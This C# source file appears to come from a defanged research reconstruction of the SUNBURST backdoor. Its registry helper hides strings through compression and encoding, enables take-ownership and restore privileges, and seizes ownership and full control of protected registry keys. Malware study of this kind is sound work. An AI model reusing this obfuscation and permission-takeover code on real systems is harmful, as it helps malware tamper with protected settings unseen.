using System;
using Microsoft.Win32;
using System.Management;
using System.Security.Principal;
using System.Security.AccessControl;

namespace SunBurstDefanged
{
	public static class RegistryHelper
	{
		private static RegistryHive GetHive(string key, out string subKey)
		{
			string[] array = key.Split(new char[]
			{
					'\\'
			}, 2);
			string a = array[0].ToUpper();
			subKey = ((array.Length <= 1) ? "" : array[1]);
			// HKEY_CLASSES_ROOT
			// HKCR
			if (a == ZipHelper.Unzip("8/B2jYx39nEMDnYNjg/y9w8BAA==") || a == ZipHelper.Unzip("8/B2DgIA"))
			{
				return RegistryHive.ClassesRoot;
			}
			// HKEY_CURRENT_USER
			// HKCU
			if (a == ZipHelper.Unzip("8/B2jYx3Dg0KcvULiQ8Ndg0CAA==") || a == ZipHelper.Unzip("8/B2DgUA"))
			{
				return RegistryHive.CurrentUser;
			}
			// HKEY_LOCAL_MACHINE
			// HKLM
			if (a == ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzBQA=") || a == ZipHelper.Unzip("8/D28QUA"))
			{
				return RegistryHive.LocalMachine;
			}
			// HKEY_USERS
			// HKU
			if (a == ZipHelper.Unzip("8/B2jYwPDXYNCgYA") || a == ZipHelper.Unzip("8/AOBQA="))
			{
				return RegistryHive.Users;
			}
			// HKEY_CURRENT_CONFIG
			// HKCC
			if (a == ZipHelper.Unzip("8/B2jYx3Dg0KcvULiXf293PzdAcA") || a == ZipHelper.Unzip("8/B2dgYA"))
			{
				return RegistryHive.CurrentConfig;
			}
			// HKEY_PERFOMANCE_DATA
			// HKPD
			if (a == ZipHelper.Unzip("8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==") || a == ZipHelper.Unzip("8/AOcAEA"))
			{
				return RegistryHive.PerformanceData;
			}
			// HKEY_DYN_DATA
			// HKDD
			if (a == ZipHelper.Unzip("8/B2jYx3ifSLd3EMcQQA") || a == ZipHelper.Unzip("8/B2cQEA"))
			{
				return RegistryHive.DynData;
			}
			return (RegistryHive)0;
		}

		public static bool SetValue(string key, string valueName, string valueData, RegistryValueKind valueKind)
		{
			string name;
			bool result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
				{
					switch (valueKind)
					{
						case RegistryValueKind.String:
						case RegistryValueKind.ExpandString:
						case RegistryValueKind.DWord:
						case RegistryValueKind.QWord:
							registryKey2.SetValue(valueName, valueData, valueKind);
							goto IL_98;
						case RegistryValueKind.Binary:
							registryKey2.SetValue(valueName, Utilities.HexStringToByteArray(valueData), valueKind);
							goto IL_98;
						case RegistryValueKind.MultiString:
							registryKey2.SetValue(valueName, valueData.Split(new string[]
							{
								"\r\n",
								"\n"
							}, StringSplitOptions.None), valueKind);
							goto IL_98;
					}
					return false;
				IL_98:
					result = true;
				}
			}
			return result;
		}

		public static string GetValue(string key, string valueName, object defaultValue)
		{
			string name;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
				{
					object value = registryKey2.GetValue(valueName, defaultValue);
					if (value != null)
					{
						if (value.GetType() == typeof(byte[]))
						{
							return Utilities.ByteArrayToHexString((byte[])value);
						}
						if (value.GetType() == typeof(string[]))
						{
							return string.Join("\n", (string[])value);
						}
						return value.ToString();
					}
				}
			}
			return null;
		}

		public static void DeleteValue(string key, string valueName)
		{
			string name;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
				{
					registryKey2.DeleteValue(valueName, true);
				}
			}
		}

		public static string GetSubKeyAndValueNames(string key)
		{
			string name;
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
				{
					result = string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
				}
			}
			return result;
		}

		private static string GetNewOwnerName()
		{
			string text = null;
			// S-1-5-
			string value = ZipHelper.Unzip("C9Y11DXVBQA=");
			// -500
			string value2 = ZipHelper.Unzip("0zU1MAAA");
			try
			{
				// Administrator
				text = new NTAccount(ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof(SecurityIdentifier)).Value;
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text) || !text.StartsWith(value, StringComparison.OrdinalIgnoreCase) || !text.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
			{
				// Select * From Win32_UserAccount
				string queryString = ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA");
				text = null;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						// SID
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						string text2 = managementObject.Properties[ZipHelper.Unzip("C/Z0AQA=")].Value.ToString();
						// LocalAccount
						// true
						if (managementObject.Properties[ZipHelper.Unzip("88lPTsxxTE7OL80rAQA=")].Value.ToString().ToLower() == ZipHelper.Unzip("KykqTQUA") && text2.StartsWith(value, StringComparison.OrdinalIgnoreCase))
						{
							if (text2.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
							{
								text = text2;
								break;
							}
							if (string.IsNullOrEmpty(text))
							{
								text = text2;
							}
						}
					}
				}
			}
			return new SecurityIdentifier(text).Translate(typeof(NTAccount)).Value;
		}

		private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
		{
			using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
			{
				RegistrySecurity registrySecurity = new RegistrySecurity();
				registrySecurity.SetOwner(new NTAccount(owner));
				registryKey.SetAccessControl(registrySecurity);
			}
		}

		private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
		{
			try
			{
				RegistryHelper.SetKeyOwner(key, subKey, owner);
			}
			catch
			{
				bool newState = false;
				bool newState2 = false;
				bool flag = false;
				bool flag2 = false;
				// SeRestorePrivilege
				string privilege = ZipHelper.Unzip("C04NSi0uyS9KDSjKLMvMSU1PBQA=");
				// SeTakeOwnershipPrivilege
				string privilege2 = ZipHelper.Unzip("C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=");
				flag = NativeMethods.SetProcessPrivilege(privilege2, true, out newState);
				flag2 = NativeMethods.SetProcessPrivilege(privilege, true, out newState2);
				try
				{
					RegistryHelper.SetKeyOwner(key, subKey, owner);
				}
				finally
				{
					if (flag)
					{
						NativeMethods.SetProcessPrivilege(privilege2, newState, out newState);
					}
					if (flag2)
					{
						NativeMethods.SetProcessPrivilege(privilege, newState2, out newState2);
					}
				}
			}
		}

		public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
		{
			bool isProtected = !reset;
			// SYSTEM
			string text = ZipHelper.Unzip("C44MDnH1BQA=");
			string text2 = reset ? text : RegistryHelper.GetNewOwnerName();
			RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text);
			using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
			{
				RegistrySecurity registrySecurity = new RegistrySecurity();
				if (!reset)
				{
					RegistryAccessRule rule = new RegistryAccessRule(text2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
					registrySecurity.AddAccessRule(rule);
				}
				registrySecurity.SetAccessRuleProtection(isProtected, false);
				registryKey.SetAccessControl(registrySecurity);
			}
			if (!reset)
			{
				RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text2);
			}
		}
	}
}
